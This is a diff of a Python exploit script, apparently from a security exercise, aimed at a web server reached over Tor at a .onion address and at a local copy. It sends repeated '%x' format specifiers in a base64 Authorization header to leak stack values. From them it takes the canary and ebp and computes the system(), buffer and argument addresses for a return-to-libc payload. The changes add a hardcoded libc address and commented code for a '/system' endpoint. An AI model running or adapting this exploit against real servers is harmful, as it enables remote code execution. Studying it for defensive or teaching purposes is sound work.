@@ -5,7 +5,7 @@ import os
 
 rt = RequestsTor() #for Tor Browser
 rt = RequestsTor(tor_ports=(9050,), tor_cport=9051) #for Tor
-# rt = RequestsTor(tor_ports=(9150,), tor_cport=9151) #for Windows Tor
+#rt = RequestsTor(tor_ports=(9150,), tor_cport=9151) #for Windows Tor
 
 url = 'http://zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/'
 url2 = 'http://127.0.0.1:8000/'
@@ -14,6 +14,7 @@ headers={
     "Host":"zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/",
     "Authorization":"Basic JXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXg6",
     }
+
 
 #Getting the information leak from format string parameter exploit using the headers above. Authorization consists of the string %x. repeated 31 times (in base64 encoded format).
 #This request here is for the remote server.
@@ -24,6 +25,12 @@ remote_data = r.headers['WWW-Authenticate'].split(sep='\"')[1].split(sep=r'.')[-
 r2 = requests.get(url2, headers=headers)
 local_data = r2.headers['WWW-Authenticate'].split(sep='\"')[1].split(sep=r'.')[-6:]
 
+#Uncomment the following lines if you want to get the local system address using the '/system' endpoint provided by our edited main.c file.
+#url3 = 'http://127.0.0.1:8000/system'
+#headers2={ "Host":"zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/", "Authorization":"Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ==" }
+#r3 = requests.get(url3, headers=headers2)
+#local_system = r3.text
+
 #Getting remote ebp and canary.
 ebp = remote_data[-2]
 canary = remote_data[1]
@@ -33,12 +40,13 @@ diff =  int(remote_data[0],base=16) - int(local_data[0],base=16)
 #print(diff)
 
 #Adding the difference to the local system address.
-ret_addr = int('f7aad830',base=16) + diff 
+local_system = 'f7b212e0' #Comment out this line here if you want to get the local system address using the '/system' endpoint provided by our edited main.c file.
+ret_addr = int(local_system,base=16) + diff
 ret_addr = hex(ret_addr)[2:]
 
 #Offset of 232 bytes behind the ebp is the buffer address.
 buffer_addr = int(ebp, base=16) - 232
-buffer_addr = hex(buffer_addr)[2:].replace('00', '04') #Some executions have 00 at the end of the canary address, so we replace it with 04 here (sic)
+buffer_addr = hex(buffer_addr)[2:].replace('00', '04') #Some executions have 00 at the end of the canary address, so we replace it with 04 here
 
 #Offset of 144 bytes behind the ebp is the argument address.
 arg_addr = int(ebp, base=16) - 144
